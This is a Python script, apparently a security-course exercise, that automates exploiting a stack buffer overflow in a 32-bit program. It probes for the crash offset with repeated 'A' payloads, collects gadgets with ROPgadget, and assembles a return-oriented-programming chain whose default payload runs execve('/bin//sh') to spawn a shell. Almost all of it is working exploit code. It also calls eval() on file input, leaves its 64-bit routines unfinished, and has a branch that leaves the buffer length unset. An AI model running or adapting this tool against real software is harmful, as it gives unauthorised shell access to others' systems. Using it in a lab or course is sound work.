import os
import ROPcompile
import ReverseExecution as RevExe
import sys

BINARY_BITS = 32

BRUTE_FORCE = 0
BINARY_SEARCH = 1

COMMAND = "execve(\"/bin//sh\")"
SHELLCODE = ["pop edx", "@ .data", "pop eax", b'/bin', "mov dword ptr [edx], eax", "pop edx", "@ .data + 4", "pop eax", b'//sh', "mov dword ptr [edx], eax", "pop edx", "@ .data + 8", "xor eax, eax", "mov dword ptr [edx], eax", "pop ebx", "@ .data", "pop ecx", "pop ebx", "@ .data + 8", "@ .data", "pop edx", "@ .data + 8", "xor eax, eax"] + ["inc eax"]*11
PROGRAM = "vuln3"
BUFFLENGTH = -1

def fileCheck(fileloc):
    try:
        f = open(fileloc, "r")
        f.close()
    except:
        print("Could not open file " + fileloc + " for read")
        quit()

def main(args):
    if len(args) < 3 or len(args) > 4:
        print("Expected 2 or 3 arguments, got " + str(len(args)-1))
        print("Correct Usage: python S3CW.py BinaryFileLocation ShellcodeFileLocation [Buffer Length]")
        quit()
    fileCheck(args[1])
    fileCheck(args[2])

    global PROGRAM
    PROGRAM = args[1]
    program = "./" + PROGRAM + " "

    global SHELLCODE
    SHELLCODE = []
    shellfile = open(args[2], "r")
    for line in shellfile:
        if(line[0:2] == "b'" and line[-2] == "'"):
            SHELLCODE.append(eval(str(line).rstrip('\n')))
        else:
            SHELLCODE.append(str(line).rstrip('\n'))

    global BUFFLENGTH
    if len(args) == 4:
        BUFFLENGTH = args[3]

    if BUFFLENGTH == -1:
        bufferLength = bufferDiscovery(BINARY_SEARCH, program)

    ROPchain = makeROPchain(SHELLCODE, bufferLength)

def bufferDiscovery(mode, program):
    global BINARY_BITS

    if BINARY_BITS == 32:
        if(mode == BRUTE_FORCE):
            print("Brute Force")
            return bruteForce32(program)
        
        if(mode == BINARY_SEARCH):
            print("Binary Search")
            return binarySearch32(program)
        

    if BINARY_BITS == 64:
        if(mode == BRUTE_FORCE):
            print("Brute Force")
            return bruteForce64(program)
        
        if(mode == BINARY_SEARCH):
            print("Binary Search")
            return binarySearch64(program)
        

def bruteForce32(program):
    fileLoc = "payload"
    test = open(fileLoc, "w")
    payload = ""
    for i in range(0, 128):
        payload = 'A' * i
        writePayload(test, payload)
        output = run(program, fileLoc)
        print("Running program with buffer of " + str(i) + ", returned code " + str(output))
        if output != 0:
            return i - 1 + (BINARY_BITS/8)
    return -1

def bruteForce64(program):
    fileLoc = "payload"
    test = open(fileLoc, "w")
    payload = ""
    
    #TODO write bruteForce for 64 bit binaries


def binarySearch32(program):
    fileLoc = "payload"
    payload = ""
    found = False
    Low = 1
    High = 1
    output = 0

    #Work Up to find a SEG FAULT
    while output != 35584:
        payload = 'A' * High
        writePayload(fileLoc, payload)
        output = run(program, fileLoc)
        print("Running program with buffer of " + str(High) + ", returned code " + str(output))
        High = High * 2
        if(High > 512):
            quit() #Exit out if buffer is very large

    #Work Down to earliest SEG FAULT
    while found == False:
        payload = 'A' * int((High + Low) / 2)
        writePayload(fileLoc, payload)
        output = run(program, fileLoc)
        print("Running program with buffer of " + str(int((High + Low) / 2)) + ", returned code " + str(output))
        if output == 35584:
            High = int((High + Low) / 2)
        if output == 0:
            Low = int((High + Low) / 2)
        if High == Low + 1:
            found = True

    return High + int(BINARY_BITS/8)

def binarySearch64(program):
    fileLoc = "payload"
    payload = ""
    found = False
    Low = 1
    High = 8192 # Arbitrary High value
    output = 0

    #TODO Write Binary Search for 64 bit binaries


def writePayload(file, string):
    f = open(file, "w")
    f.write(string)

def run(program, payload):
    command = program + payload
    return os.system(command)

def makeROPchain(shellcode, bufflength):

    #Find ROP gadgets
    os.system("ROPgadget --binary " + PROGRAM + " > rop.txt")

    #Write Shellcode as gadgets
    dictionary = {}
    ROPcompile.LoadGadgetDictionary("rop.txt", dictionary)
    gadgets = dictionary.keys()
    payload = RevExe.create(shellcode, gadgets)
    bpayload = ROPcompile.AssemblyListToGadgets(payload, bufflength, dictionary)
    print()
    print("Payload:")
    print(bpayload)

    #Write the payload
    pfile = open("payload", "bw")
    pfile.write(bpayload)


def fileCheck(fileloc):
    try:
        f = open(fileloc, "r")
        f.close()
    except:
        print("Could not open file " + fileloc + " for read")
        quit()

if __name__ == "__main__":
    main(sys.argv)